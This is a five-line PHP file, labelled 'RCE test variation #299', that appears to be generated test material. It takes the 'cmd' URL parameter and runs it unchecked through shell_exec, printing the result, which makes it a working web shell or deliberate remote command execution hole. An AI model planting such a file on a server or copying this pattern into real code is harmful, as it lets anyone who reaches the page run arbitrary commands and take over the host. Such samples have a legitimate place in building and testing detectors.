<?php
// RCE test variation #299
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>